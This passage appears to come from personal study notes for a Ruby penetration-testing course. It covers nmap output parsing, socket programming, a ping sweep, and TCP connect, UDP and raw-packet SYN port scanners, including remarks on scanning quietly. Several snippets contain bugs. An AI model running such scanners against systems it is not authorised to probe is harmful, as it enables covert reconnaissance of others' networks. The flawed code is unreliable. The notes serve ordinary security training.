(therefore it does not have the suffix arg):  File.dirname path  # Output: \"~/ruby/file_example\"   extname method returns the extension of the file of the given path while split returns an array containing both dirname and basename:  File.extname path  # Output: \".txt\" File.split path # Output: [\"~/ruby/file_example\", \"test.txt\"]   join method allows us to create string paths. With FILE::SEPARATOR u can create both relative and absolute paths:  File.join(\"~\",\"ruby\",\"file_example\") File.join(\"\",\"root\",\"ruby\",\"file_example\")   expand_path method converts a relative path to an absolute path. It has two arguments, the second is optional and if its provided, its prepended as a directory to the first argument.     If the first agument contains a ~, then the current user home directory is used; otherwise the current working directory is used as the prepended directory.   File.expand_path(\"nested_dir\") # Output: \"/root/ruby/file_example\" File.expand_path(\"~/Desktop\") # Output: \"/root/Desktop\" File.expand_path(\"Documents\",\"/root\") # Output: \"/root/Documents\"   fnmatch method tests if a filename string matches a specified pattern. The pattern is not a regular expression but its the usual glob syntax (first argument):  File.fnmatch(\"*.txt\",\"test.txt\") # Output: true File.fnmatch(\"*.rb\",\"test.txt\") # Output: false File.fnmatch(\"*.rb\",\"example.rb\") # Output: true File.fnmatch(\"/*/*.rb\",\"/root/ex.rb\") # Output: true   Creation / Deletion / Renaming  open method with the write modifier w to create a file:  File.open(\"a_file.txt\",\"w\")      u can also use new to create    rename allows u to rename a file or a directory:  File.rename(\"a_file.txt\",\"new_file.txt\")   delete and unlink are used to delete a file:  File.delete \"new_file.txt\"   chmod to change the permissions of a file:  File.chmod(0666, \"test.txt\")   // the chown is used to change the owner and the group of a file   → moreover files: http://ruby-doc.org/core-1.9.3/File.html   File Stream   Reading From a file  → http://ruby-doc.org/core-1.9.3/IO.html   → http://ruby-doc.org/core-1.9.3/File.html   If open is followed by a block, the file object is passed to the block and the stream is automatically closed at block termination:  File.open(\"multi_line.txt\",\"r\") do |file|   contents = file.read   puts contents end   Output:  first line second line third line   read can be used without opening the file:  content = FIle.read(\"multi_line.txt\")   // the same output   The method readline is similar to read but it can be used to obtain an array containing the line of the file:  File.readlines(\"multi_line.txt\")   each can also be used to read a file line by line:  file = File.new(\"text.txt\",\"r\") count =0 file.each do |line|   puts \"n:#{count} #{line}\"   count+=1 end      There are other methods to read only characters (readchar) and bytes (readbyte):    Writing to a file   - w = write only - w+ = read and write - a = append  - a+ = append and read  File.open(\"text.txt\",\"w\") do |file|   file.puts \"First line \\n\"   # or   File.write \"Second line\" end    Working with NMAP files   IP Extraction  nmap -PE -sn -n   -PE = ICMP echo request -sn = only PING Scan (disable port scan) -n = Never do DNS resolution   NMAP Types of outputs:  -oN = normal output -oX = xml format -oG = greapable format -oA = create 3 files with all the previous formats   We can grab the IP with regular expression :  /^(?:Nmap scan report For )((?:\\d{1,3}\\.){3}\\d{1,3})/      (?:Nmap scan report For ) = identifies if the line starts with nmap scan report For    ((?:\\d{1,3}\\.){3}\\d{1,3}) = matches an IP address      (?: ) syntax avoids capturing the subexpression inside parentheses. They are groups and they are used to capture more than one pattern inside a string.   Therefore if we use (?: ), when we compare the entire pattern with a string, it does not capture the subexpression inside it.   example 1 : Grab IP from NMAP normal format  begin   File.open(ARGV[0], \"r\") do |file|     file.each do |line|       /^(?:Nmap scan report For )((?:\\d{1,3}\\.){3}\\d{1,3})/ =~ line       puts $1 if $1     end   end rescue StandardError =&gt; e   puts \"An error occurred: #{e}\" end     example 2 : Grab IP from NMAP Grepable format  begin   File.open(ARGV[0], \"r\") do |file|     file.each do |line|       /^(?:Host:)\\s((?:\\d{1,3}\\.){3}\\d{1,3})/ =~ line       puts $1 if $1     end   end rescue StandardError =&gt; e   puts \"An error occurred: #{e}\" end       NMAP XML file   its not a good idea to use regexp, its better to parse the data   we want to extract the addr attribute of the address node   → https://www.w3schools.com/xml/xquery_intro.asp   → https://www.w3schools.com/xml/xpath_intro.asp           // if u want learn more about xml structures            Ruby provides different libraries and gems to handle XML. One of them is REXML module.       → http://www.germane-software.com/software/rexml/   → http://ruby-doc.org/stdlib-1.9.3/libdoc/rexml/rdoc/REXML.html   We have to reach the address node of each host node. In xpath, we can achieve this using different strategies:  /nmaprun/host/address[@addrtype='ipv4'] # means that we start from the root node (vertex), then go down in the host node and finally we go down in the address node which contains the addrtype attribute equals to ipv4  //host/address[@addrtype='ipv4'] # means that there is not a starting point, rather all of the times we find a host node, we have to go down in an address node and check the addrtype.       Since we will use REXML, one of the previous syntax must be inserted in one the method provided by REXML For data extraction.   example 3 - Grab the NMAP XML output:  require \"rexml/document\" begin   doc = REXML::Document.new File.new(ARGV[0])   doc.elements.each(\"//host/address[@addrtype='ipv4']\") do |addr|     puts addr.attributes[\"addr\"]   end rescue Exception =&gt; e   puts e end   All Together      add the shebang, it tells what  interpreter that executes the scripts code.   which ruby = /usr/bin/ruby set executions permitions with chmod +x &lt;file.rb&gt;    #!/usr/bin/ruby # this method contains the main script logic def main(opt,file)   case opt     when nil then usage     when \"-oN\" then normal file \twhen \"-oG\" then grepable file \twhen \"-oX\" then xml file \telse detect opt   end end      if we want to execute the script from any directory, we need to add the directory of the script to the root user PATH environment variable   we have to change the PATH variable in the .bashrc file contained in the root user home dir   Add the line:  export PATH=/&lt;path of the script&gt;:$PATH      the normal - grepable - xml methods, contain the same code of the specific format scripts that we did earlier.   lets see the method detect   If no option is provided the script detects if a standard nmap output file is provided:   .nmap | .xml | .gnmap  def detect(file)   extensions = [\".nmap\",\".xml\",\".gnmap\"]   opt = [\"-oN\",\"-oX\",\"-oG\"]   i = extensions.index(File.extname file)   # if the file has a valid standard extension we retry   # the main method with the correct option   (main(opt[i].file);return) if i   #otherwise an exception occurs   raise Exception.new(\"Supported extensions: \"+extensions.join(\" | \")) end    Open Ports Extraction   We will see how to extract IP addresses and ports from the command:  nmap -sS -n # -sS = TCP SYN request # -n = never do DNS resolution   The arguments that the script should handle are the following:  pextr-n.rb ip [-closed | -filtered | -open] file    #!/usr/bin/ruby  begin   # escape all the dots ( . ) -&gt; ip is used in    # ip_pattern regular expression   ip = ARGV[0].gsub(\".\",\"\\\\.\")      # check if the optional argment 'state' is provided   options=[\"-open\",\"-closed\",\"-filtered\"]   # [1..-1] deletes the first minus character from ARGV[1]   port_state=ARGV[1][1..-1] if options.include? ARGV[1]   # if port_state is nil - &gt; default state is 'open'   port_state = \"open\" if !port_state   # check if argument is the file   file = ARGV[2] if ARGV[2] #if the optional state holds   file = ARGV[1] if !file # if no optional state       first we have to find the section in the file that contains information of the IP provided                                   then we have to extract all the ports that have the desired state (open           close           filtered)                           Ip and port_state created previously:  ip_pattern=/^Nmap scan report For #{ip}$/ up_host_pattern=/^Host is up (?:.)*\\n/ port_pattern=/^(?:(\\d+)\\/\\w+\\s+#{port_state}\\s+.+\\n)/      now we can read one line at time   once we find the correct IP (ip_pattern matched), if the host is alive (up_host_pattern matched), we can extract every port that is open or closed or filtered, according to our need (port_pattern matched)    stream = File.new(file, \"r\") # Open the file stream  stream.each do |line| # For each line of the stream   line.match(ip_pattern) do # If the IP is found and the IP host is up, extract each port     stream.readline.match(up_host_pattern) do       stream.readline # Reads a line of type not shown *closed ports*       stream.readline # Reads a line of type: \"PORT STATE SERVICE\"        stream.each do |line| # From here, each line stores the port         line =~ port_pattern # Line matches the port sub-pattern         puts $1 if $1 # Print the port         break if line == \"\\n\" # If all the lines have been parsed, exit from the block       end     end   end end    Example usage:  ./pextr-n.rb &lt;ip&gt; -filtered &lt;nmap file&gt; ./pextr-n.rb &lt;ip&gt; &lt;nmap file&gt; # open ports only   Grepable format     the recurring pattern is:   port/status/protocol//service   we can do it with String scan method   Example:  up_host = /^Host:\\s#{ip}\\s\\(\\)\\s+Status: Up/ port_pattern = /(?:\\s(\\d+)\\/#{port_state}\\/[^\\/]+\\/\\/[^\\/]+\\/\\/\\/)/ #for each line of the stream stream.each do |line|   #if the ip is found   line.match(up_host) do \t#reads the next line and extracts each port with scan method \tstream.readline.scan(port_pattern) {|port| puts port}   end end    The usage is the same as the last one:  ./pextr-g.rb &lt;ip&gt; -filtered &lt;nmap file&gt; ./pextr-g.rb &lt;ip&gt; &lt;nmap file&gt; # open ports only    XML format     we are interested into the following path type:   host &gt; ports &gt; port &gt; portid   - the following syntax allows us to go only into ports nodes that are opened and are related to the ip &lt;ip&gt; - //host[address/@add='10.50.97.5']//port/state/@state='open'] - Remember that [] are For conditional statement and @ is used to indicate an attribute of a node - the above string means that if we find an **host** node that has the address child node with the attribute **addr** equals to 10.50.97.5, then it should go into the **port** node that has a state node with the attribute **states** equals to open   parses the xml file to create a tree  doc = REXML::Document.new File.new(file)   XPath syntax to extract only the desired ports  pattern = \"//host[address/@addr='#{ip}']//port[state/@state='#{port_state}']\"      For each address node child of host node puts to stdout the addr attribute    doc.elements.each(pattern) do |port|   puts port.attributes[\"portid\"] end   The usage is the same:  ./pextr-x.rb &lt;ip&gt; -filtered &lt;nmap file&gt; ./pextr-x.rb &lt;ip&gt; &lt;nmap file&gt; # open ports only   All together   #!/usr/bin/ruby # this method contains the main script logic require \"rexml/document\"  begin      (usage;exit) if !match_ip(ARGV[0])   ip = ARGV[0]    state,default = match_state(ARGV[1])   type = default ? ARGV[1] : ARGV[2]   file = default ? ARGV[2] : ARGV[3]   f_type,file = match_file(type,file)  main(f_type,file,state,ip)  rescue SystemExit rescue Exception =&gt; e   puts e  end     def usage st = &lt;&lt;END pextr eLearnSecurity \\u00A9 2014 It extracts (open|filtered|closed) ports of a specified ip address from nmap results. Usage: pextr ip [Port State] [File Type] file|stream  PORT STATE  -open      opened ports (default)  -filtered  filtered ports  -closed    closed ports          FILE TYPE  -oX when file is an xml nmap output  -oN when file is a normal nmap output  -oG when file is a grepable nmap output           [File Type] is not required when file has   .nmap | .xml | .gnmap extension  EXAMPLES  pextr 10.50.97.5 nmap.xml  pextr 10.50.97.5 -filtered -oX nmap.xmlout  pextr 10.50.97.5 -closed file.nmap  nmap -sS -n 192.168.1.15 | pextr 192.168.1.15 -oN  END   puts st end    Network   The Network \t   Socket Basics \t\t   Penetration Testing Activities \t\t   Raw Socket \t   OS Interactions   The Network   We will see how to connect to a time server:   → TCPSocket - http://ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/TCPSocket.html   → UDPSocket - http://ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/UDPSocket.html   → high level protocols = http://ruby-doc.org/stdlib-1.9.3/libdoc/net/   Sockets Basics   TCP Client   RFC868  → http://tools.ietf.org/html/rfc868      TCPSocket is very simple, it requires a socket library.   Lets us connect to the TIME server ip:64.113.32.5 port:37   example 1:  require 'socket'   true s = TCPSocket.open(\"165.193.126.229\",37) res = s.gets   \"\\xD6\\x94\\xA2\\xC2\" int = res.unpack('N')   [3600065218]   # since the Unix timestamp starts from 1 jan 1970 GMT, we must subtract 2208988800 time = Time.at(int[0]-2208988800) # Output: 2014-01-30 11:31:20 +0100 s.close   example 2:  time = TCPSocket.open(\"165.193.126.229\",37) do |s|   Time.at(s.gets.unpack('N')[0] - 2208988800) end # Output: 2014-01-30 11:31:20 +0100  # we can also do it in one line, just replace the do .. end with { }   example 3:  time = TCPSocket.open(\"165.193.126.229\",37) { |s| Time.at(s.gets.unpack('N')[0] - 2208988800)}      The addr method can be used to obtain information about local part of the stream. It returns the local address as an array which contains address_family, port, hostname and numeric_address   s.addr in this case will return these informations   s.peeraddr - to obtain the same information about the remote part of the stream   s.peeraddr true = to specify that we want a reverse DNS lookup and find the hostname      to specify the port we need to use open with two parameters: source ip, port ip   For example:  s = TCPSocket.open(\"165.193.126.229\",37,\"10.0.2.15\",6000) s.addr [\"AF_INET\",6000,\"10.0.2.15\",\"10.0.2.15\"]   UDP Client  Udp is stateless and connectionless protocol:  require 'socket' s = UDPSocket.new s.send(\"\",0,\"165.193.126.229\",37)  resp = s.recv(4) # Output: \"binary data\" time = Time.at(resp.unpack('N')[0] - 2208988800) # Output: \"time \"       udp can lose packets because it doest not have an ack. So our recv can wait the packets in freeze our application.   To avoit this situation we can use recv_nonblock that does not wait For the response.   if no response is received, it raises an exception; therefore u can rescue it and continue with the script execution.   The server  Create a TCPServer instance with new and provide the IP and port as arguments:  server = TCPServer.new ip,port   Cccept client requets:  loop do   client = server.accept end   Server logic code:      first, the server prints the information about the connected client; Then it sends the correct Time information according to the received type string   print Time.new.to_s + \" - IP: \"+client.peeraddr[3] print \" Port: \"+client.peeraddr[1].tp_s+\"\\n\" case client.gets.chop   when \"timestamp\" then client.puts(Time.now.to_i)   when \"utc\" then client.puts(Time.now.utc)   when \"local\" then client.puts(Time.now)   else client.puts(\"Invalid operation\") end      to finish the code we add the def main(ip,port) at the beginning   and client.close at the end   This is not suitable to handle a large number of client connections at the same time. In this situation, usually a multi-thread server is used; one thread is given at each client connection and the server can handle multiple connections at the same time (this avoids long queues)   Multi-threading tcp server (skeleton) example:   # new TCP server bound to ip and port arguments server = TCPServer.new ip,port # loop indefinitely to accept clients requests loop do   # new request accepted - client is a socket   # logic block is executed in a new thread   Thread.start(server.accept) do |client| \t#.. server logic.. \t# client variable is used to interact  \t# with the connected client   end end    The Client  def main(host, port, type)   # open the connection with the time server   # available on host and port arguments   TCPSocket.open(host, port) do |s| \t#send to the server the type of time we want \ts.puts(type) \t# (timestamp|utc|local) \t# receives and puts to stdout the formatted time \tputs s.gets   end end   Run the server:  ./time_Server.rb &lt;ip&gt; &lt;port&gt;   Run the client:  ./time_client.rb &lt;ip&gt; &lt;port&gt; timestamp # Output: 1391425207      The server will get information of the client request    Ping Sweep     using ICMP echo requests   if the destination host is alive (and the ping is not filtered by a firewall), it will respond with a ICMP echo reply   there are a lot of gems that w can use   net-ping: a collection of classes that provide different ways to ping computers      To install a gem: gem install net-ping -r    Example:  require 'net/ping' host = ARGV[0] req = Net::Ping::ICMP.new(host)  if req.ping then puts host + \" UP\" else puts host + \" DOWN\" end      if the timeout is not provided we use 1 second by default. Then we scan each host of the network, sending an ICMP request andprint the current IP    require 'net/ping'  def main(network, timeout)   timeout = timeout ? timeout.to_f : 1    (1..254).each do |i|     ip_address = network + i.to_s     req = Net::Ping::ICMP.new(ip_address, nil, timeout)      puts ip_address if req.ping   end end  begin   unless ARGV.length == 2     puts \"Usage: ruby script_name.rb network timeout\"   else     main(ARGV[0], ARGV[1])   end end        the network must be “xxx.xxx.xxx.”   eg: “192.168.1.”   Time ruby ping_sweep.rb &lt;ip&gt; 0.15 // 0.15 seconds For each IP # 10.0.2.2 # 10.0.2.3 # 10.0.2.4 # etc   TCP Connect - Port Scanning     a port scan can be performed after the identification of an alive host or it can be used to verify if an host is alive.   There is different types of port scanning:  TCP full connection TCP SYN TCP ACK UDP   The strategy to perform the scan:  with TCPSocket, we try to connec to an host port if the connection is successful (TCP three way handshake), then the port is clearly open if the connection is refused, then the port is closed or firewalled (the host or the firewall respond with RST+ACK) otherwise, if we do not receive a response, there is probably a firewall that filters the port with no response at all.      Imagine a service filtered based on source IP addresses. If u r not in the source IP whitelist, u will receive an RST+ACK but the port is actually open as well as the service.   The skeleton of the script   For each port between start_port and end_port, we the connection and we identify if its filtered or open:   require 'socket'  def main(host, start_port, end_port)   open = []   filtered = []    start_port.upto(end_port) do |port|     begin       # Replace the comment below with your actual TCP socket connection logic       socket = TCPSocket.new(host, port)       socket.close       open &lt;&lt; port     rescue StandardError       filtered &lt;&lt; port     end   end    puts \"OPEN\" unless open.empty?   puts open.join(', ') unless open.empty?   puts \"FILTERED\" unless filtered.empty?   puts filtered.join(', ') unless filtered.empty? end  # Example usage: # main(\"example.com\", 80, 100)     The TCP SOCKET CONNECTION skeleton:  begin   TCPSocket.open(host,port)   open.push port rescue Errno::ETIMEDOUT   filtered.push port rescue Errno::ECONNREFUSED end      if no exception occurs, then the port is open and we push it into the open array. If a timeout error is raised, the port is certainly filtered and we push it into the filtered array    Usage:  ruby tcp_cps.rb &lt;ip u want to scan&gt; 1-600 # port range   - the nmap equivalent to this is **-sT** - nmap -sT -n &lt;ip&gt; -p &lt;range&gt; - nmap uses faster strategies. one of them is working with more than one thread. - our script is slow, a solution to this problem would be implementing multi-threading   UDP Port scan     Some import services such as DNS, SNMP and DHCP use UDP        udp is often ignored because its stateless and sometimes identifying if an UDP port is open or closed may take a lot of time.       For this reason, during our security audits we should run a UDP port scan, only to well-known ports and services, and only if its strictly necessary (do not scan big ranges of ports)   Nmap documentation reports that a full and reliable UDP port scanning (65535 ports) can take more than 18 hours in some systems.   Strategy to identify UDP open ports:  first of all, we send an UDP packet to a port; if we receive an ICMP error (destination unreachable or others) then we can conclude that the port is closed or firewalled; if we receive an UDP response then the port is open and the service is available.      UDP is stateless, therefore if we do not receive a response, there is a chance that a packet (request or response) has been lost.   there is also the likelihood that a firewall which avoids sending a ICMP packet as a response. Therefore when we use UDP, we should try to send the request packet more than once.   platforms like Linux usually avoid sending too many packets of the same type (ICMP is one of them) in order to avoid network congestions. Linux sends an ICMP packet once per second; therefore our script must take this behavior into account.   This is the skeleton of the script. We accept an array of ports to test. For each port, we have to send some UDP packets and catch any response:   require 'socket'  def main(host, ports)   open = []   filtered = []   closed = []    # ports is an array of port   ports.each do |port|     begin       # Replace the comment below with your actual UDP packet sending logic       socket = UDPSocket.new       socket.connect(host, port)       socket.send(\"Your UDP packet payload\", 0)       open &lt;&lt; port     rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH       filtered &lt;&lt; port     rescue StandardError       closed &lt;&lt; port     ensure       socket&amp;.close     end   end    puts \"OPEN\" unless open.empty?   puts open.join(', ') unless open.empty?   puts \"FILTERED|OPEN\" unless filtered.empty?   puts filtered.join(', ') unless filtered.empty?   puts \"CLOSED\" unless closed.empty?   puts closed.join(', ') unless closed.empty? end  # Example usage: # main(\"example.com\", [80, 443, 8080])        For each targert port, the first thing to do is to create an UDPSocket which will be bound to the destination host and port.   Then we want to send 5 UDP packets using a proper timing strategy:  ports.each do |port|   u = UDPSocket.new   u.connect(host,port)   (1..5).each do |i| \t  #send 5 UDP packet \t  # with a proper timeout   end end      First we send a packet and wait For the first response   if no response is received, the timeout is triggered (note that the timeout is incremental)   If the timeout is triggered For all 5 packets then we consider the port filtered:  require 'timeout' require 'socket'  u = TCPSocket.new('example.com', port) open = [] closed = [] filtered = []  (1..5).each do |i|   begin     Timeout.timeout(i * 0.5) do       u.write(\"\\0\")       u.recv(10)       open.push(port)     end   rescue Errno::ECONNREFUSED     closed.push(port)   rescue Timeout::Error     filtered.push(port) if i == 5   ensure     break   end end  u.close    We can improve the script even more:      by add regex to verify the command parameter format (ip and ports)       by add different logic (timing strategy or a multi-thread)    Raw Socket  Can be used to interact with the network using a low level strategy. They usually needs root privileges to be used.   Raw sockets allow one to forge network packets (IP, UDP, TCP, and so on) by yourself but a high knowledge of network protocols and headers is required.      If u r familiar with low level concepts, check these links   → http://www.ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/Socket.html   → http://www.ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/BasicSocket.html   PacketFu  → https://github.com/todb/packetfu   → http://rubydoc.org/github/todb/packetfu/PacketFu      PacketFu is a Ruby library For reading and writing packets to a network interface.   it requires pcarub to work. (another gem)   Follow these steps to install PacketFu in Kali:  apt-get install ruby-dev apt-get install libpcap-dev gem install -r pcaprub gem install -r packetfu   To find what your gem path is:  gem env   Open PacketFu:  # go to the examples path in &lt;gem env path&gt; ruby packetfu-shell.rb      if Packet capturing/injecting is enabled it works    Usage  pry --simple-prompt require 'packetfu'   We can use many classes For different purposes:  PacketFu::IP PacketFu::TCP PacketFu::UDP   In order to avoid writing the PacketFu namespace each time, we can use include:  include PacketFu IPHeader # the same as PacketFu::IPHeader TCPPacket # the same as PacketFu::TCPPacket   Utils class contains utility methods.   For example, it can be used to obtain information about our machine interfaces:  Utils.ifconfig(\"eth0\")   Perform an ARP request. // however it returns the mac address only if the specifies IP belongs to your default network interface (usually “eth0”):  Utils.arp(\"192.168.1.2\")   To see the default network interface use by PacketFu:  Utils.whoami?   Forge a custom packet  Common packets classes:  ARPPacket  # constructs ARP packets EthPacket   # constructs Ethernet packets ICMPPacket # constructs ICMP packets IPPacket     # constructs IP packets TCPPacket  # constructs TCP packets UDPPacket # constructs UDP packets   Each of the previous classes use suitable header and option or flags:  IPHeader     # a complete IP structure ICMPHeader # a complete IP structure TCPHeader   # a complete TCP structure TCFlags     # Implements flag For TCPHeader ARPHeader # a complete ARP structure   Lets see how to create a UDP packet from scratch:  u = UDPPacket.new   To send a packet using PacketFu   First we need to use recalc method to recalculate all of the checksums of the packets, then to_w:  u.recalc u.to_w           since we will forge the entire packet headers (Ethernet, IP and UDP), we have to be careful in order to create the packet correctly.       In order to obtain information such as the source IP, MAC address and gateway MAC address, we can use the class Utils.   When we do not specify an interface, PacketFu uses the default eth0 so take that into account.   The method Utils.whoami? contains the correct field values that we need (source MAC and IP addresses as well as the default gateway mac address):  Utils.whoami? s_ip = Utils.whoami?[:ip_saddr] s_mac = Utils.whoami?[:eth_saddr] # source address g_mac = Utils.whoami?[:eth_daddr] # destination address   Set the UDP raw packet:  u.eth_saddr = s_mac u.eth_daddr = g_mac   Set the IP header:  u.ip_saddr = s_ip u.ip_daddr = \"&lt;destination IP&gt;\"   Set the UDP source and destination ports:  u.udp_sport = 5000 u.udp_dport = 37   We can send the packet now:  u.recalc u.to_w      sniff the traffic with wireshark to grab the packet       Since we are using raw sockets, we sent the packets directly to the network without going through the kernel TCP/IP stack   This means that in our kernel, we do not have a real socket (bound to UDP source port) that is waiting For an UDP time response   As defined in the UDP/TCP RFC, when the kernel receives an undesired UDP packet, it responds with an ICMP destination unreachable (Port unreachable)   A trick to avoid the ICMP kernel response is to create an UDP socket which binds itself to our source port.   Now the kernel has its socket bound to the source port 5000 so the ICMP packet is no longer generated by the OS:  s = UDPSocket.new s.bind(\"192.168.3.24\",\"5000\") u.to_w      Doin the same thing For all other packets can be tedious. PacketFu allows some different methods to forge packets quickly   We can use config parameter:  u = UDPPacket.new(:config=&gt;Utils.whoami?)   TCP SYN port scanner      now we can write more sophisticated tcp port scanner that avoid finalizing the 3-way handshake. This is called TCP SYN scan   TCP SYN scan can be used to leave no trace   A common DOS attack is called TCP SYN flood, where the attacker sends  a flood of syn packets, until a crash happens.   The strategy      The syn packet sends a syn   if the port is open the target answer with syn,ack   and we send RST to close the connection, means that we do not close the 3way handshake with another ack   if the port is closed, after the first syn, the target answers with a RST+ACK   if the ports is filtered, we will send 2 syns without any answer      To create TCPPacket using packetFu, we need to set the Ethernet, the IP header fields and the TCP header with the correct destination port and SYN flag enabled   We can use the config aswell:  t = TCPPacket.new(:config=&gt;Utils.whoami?)   Pay attention, Eth destination now is not the default gateway      the target host 192.168.3.14 belongs to our network   Since its in our network, we can grab the MAC with an ARP request:  t.ip_daddr = \"192.168.3.14\" t.eth_daddr = Utils.arp(\"192.168.3.14\") # mac output t      now EthHeader and IPheader have the correct value    The destination port is 135 while the source port may be a random value:  t.tcp_sport = 5000 t.tcp_dport = 135 t.tcp_flags.syn = 1  t      Now the TCP packet is properly configured    Its ready to be sent:  t.recalc t.to_w # we can analyse with wireshark   We want our script to be capable of detecting the SYN+ACK. PacketFu provides the Capture class to sniff every packet received on a specific network interface.      to use capture we need to create a Capture object and then specify the interface where it will capture the traffic (eth0 is the default NIC)   after this, we can use the capture method to sniff packets received by the interface. we can also specify a filter as a capture parameter in order to capture only specific packets.   To extract all of the TCP packets that have source IP address equal to 192.168.3.14 and 135 as source port from the eth0 interface:  cap = Capture.new(:iface=&gt;\"eth0\")   The filter For the capture method is given usinf the BPF syntax (Berkeley Packet Filter):  src host 192.168.3.14 and src port 135 cap.capture(:filter=&gt;\"src host 192.168.3.14 and src port 135\")   To check if our interface received a packet which matches the filter, we can use the next method. If it returns nil, it means that there is not one matching. Otherwise, the packet is returned:  raw_packet = cap.next      PacketFu allows one to parse raw packets using the Parse class.   Parsing the received raw_packet we will obtain a PacketFu TCP packet:  tcp_packet = Packet.parse raw_packet      As we can see in the interpreter, the packet received is the desired SYN+ACK (flag A and S) packet coming from port:135 and host:192.168.3.14    The script  First, we have to start a packet sniffer that is able to read all of the response packets: SYN+ACK For opened ports and RST+ACK For closed ports.      when the sniffer is ready, we can send the TCP SYN packet For each port we want to test   For all of the ports that are not opened or closed, there is a high likehood that they are filtered:  def main(host, start_port,end_port)   open = []; closed = []   start_capture(host,open,closed,start_port,end_port)   send_tcp_syn(host,start_port,end_port)   filtered=(start_port..end_port).to_a - (open+closed)   puts \"OPEN\",open if !open.empty?   puts \"FILTERED\",filtered if !filtered.empty? end   For the start_capture method, a new thread is required; we sniff TCP SYN+ACK and RST+ACK at the same time we send TCP SYN:  require 'packetfu'  def start_capture(host, open_ports, closed_ports, start_port, end_port)   Thread.new do     cap = Capture.new     cap.capture(filter: \"tcp and src host #{host}\")      cap.stream.each do |raw_packet|       tcp_packet = Packet.parse(raw_packet)       port = tcp_packet.tcp_sport.to_i        next unless port.between?(start_port, end_port)        flags = tcp_packet.tcp_flags        if flags.syn == 1 &amp;&amp; flags.ack == 1 &amp;&amp; !open_ports.include?(port)         open_ports.push(port)       elsif flags.rst == 1 &amp;&amp; flags.ack == 1 &amp;&amp; !closed_ports.include?(port)         closed_ports.push(port)       end     end   end end       The method send_tcp_syn first creates a TCPPacket and sets the correct mac address (default gateway if the host is outside the network – host mac address coming from ARP request if the host belongs to our network)   Then For each port, it sends a TCP SYN packet (two times to avoid packets loss):  def send_tcp_syn(host,start_port,end_port)   t = TCPPacket.new(:config =&gt; Utils.whoami?)   t.eth_daddr = Utils.arp(host) if Utils.arp(host)   t.ip_daddr = host   t.tcp_flags.syn = 1   start_port.upto(end_port) do |port| \tt.tcp_dport = port \tt.recalc \t2.times.each { t.to_w;sleep(0.02)}   end   sleep(1) end   The sleep methods in the previous implementation are used to avoid creating a flood of SYN packets against the target host.      with too many TCP requests For connection, the target host may become suspicious   the greater the time between each TPC SYN is, the more silent the scanning is.   Tcp_sps.rb (TCP SYN port scanner), first we start reading the parameters:  ruby tcp_sps.rb host start_port-end_port   example:  ruby tcp_sps.rb 192.168.3.14 100-200 # scan ports from 100 to 200 on the host 192.168.3.14   Kernel Exec     it replaces the current Ruby process with the command passed as argument   this means that the original command is stopped. therefore there is no way to interact with the new command.   The exec method is an abbreviation For kernel.exec method and it could be useful if u have a script that executes some logics and then it needs to call an external OS command without interacting with it.   u will probably never have the need to use it but its an interesting method that we may want to know:  pry --simple-prompt exec 'echo \"Hello world\"' # Output: Hello World      The echo command replaces the pry interpreter    Kernel System  It differs from exec. it does not replace the current process; instead it creates a subshell and executes the command passed as argument inside it.      finally, it returns true if the command argument was found in the OS and it was executed correctly. otherwise it returns false.   moreover, it prints the stdout and the stderror of the command as argument and it sets the global variable $? with the exit status information of the command execution.   System is a Kernel method too. Therefore u can use the OO notation Kernel.system to call it.   Example:  → system 'echo \"Hello\"' $?  # now the global variable holds some status $?.pid  # Output: 3458 $?.exitstatus  # Output: 0      When the command is not found. False is returned and the stderror is printed.       system method does not terminate the original process execution but it does not provide a way to interact with the command executed.   therefore u cannot handle the sub-commands outputs (stdout and stderror) in any way.   Kernel Backticks   Its another method to execute system commands in a sub-shell      it works as Kernel system method but the returned value is the standard output of the command executed in the sub-shell   When using it, u can handle the output of any command sub-executed Usage: ```ruby output = ‘echo “hello”’ output   //”hello” // or u can use with the OO notation Kernel.’(command)            ‘   For example, how to extract the eth0 ip address  With regex: ```ruby 'ifconfig eth0' =~/inet addr:([0-9.]*)/ $1 # Output:  192.168.3.29   With kernel backsticks:  puts %x{ifconfig eth0} # Output: eth0 output   IO popen  Method provided by the IO class   The command stdin and stdout will be connected to the returned IO object (u cannot get the stderr)   Usage:  fd = IO.popen('echo \"hello\"') fd.readline # Output: \"hello\"                  IO.popen opens input and output streams with the sub-command (according to the opening mode r       r+       w       w+…). Therefore, u can use all of the methods seen when we talked about streams.           → moreover: http://ruby-doc.org/core-1.9.3/IO.html   Open3 popen3  Used if u want to interact with all of the three sub-command stream: stdin, stdout and stderr:  require 'open3'   Example: execute nslookup command:  sin,sout,serr = Open3.popen3('nslookup') sin.puts \"www.google.com\" sout.gets # Output: \"Server:\\t\\t192.168.3.1\\n\"  sout.gets # Output: \"Address:\\t\\t192.168.3.1#53\\n\"   All together  The most used are Kernel backticks and Open3 popen3      we want to create a script that takes as input a target network, performs a ping sweep and then shows a menu to select one port scanning technique (UDP, TCP Connection, TCP SYN)   we need to interact with uphosts and pextr commands; we have to send the nmap output to the commands input stream.   therefore we have to use a method that allows to send data to stdin; we will use Open3 popen3   Usage command scan:  scan &lt;network&gt; // discover targets in the network using ICMP ping request strategy      As usual, the script can be improved. we can add other port scanning techniques, the possibility to choose a range of custom ports, and so on.    Lab   Task 1: Discovery alive hosts  nmap -PE -sn -n 172.16.10.0/24 -oA=rede10      Run a host discovery scan with Nmap and save the output in the three most used formats: XML, grepable and normal output. The remote networks are 172.16.10.0/24 and 172.16.11.0/24.   Task 2 - ip extraction  sudo nmap -PE -sn -n 172.16.10.0/24 | ./ip_extraction_nmap-2.rb   // the script    #!/usr/bin/ruby  begin   stream = $stdin   stream.each do |line| \t/^(?:Nmap scan report \\for )((?:\\d{1,3}\\.){3}\\d{1,3})/ =~ line \tputs $1 if $1 end rescue Exception =&gt; e   puts end    Task 3 - Open ports  nmap -sV -T4 172.16.10.0/24 -oA=rede10-ports   Task 4 - Port extraction   Web   Starting Point  Request and Response  Data Extraction  Exercises   HTTP Protocol     we will focus no http   Rubys alternatives to interact with a web server   Using simple socket      it may happen that u have to test the behavior of a server when it receives incorrect packets.   Our target is the simple index page of the apache web server:  service apache2 start      we want to obtain the same page using Ruby and a TCP socket.   The first thing to do is to open a TCP connection with our localhost on port 80:  s = TCPSocket.new(\"localhost\",80)   The correct verb to use is GET and the path is /:  request = \"GET / 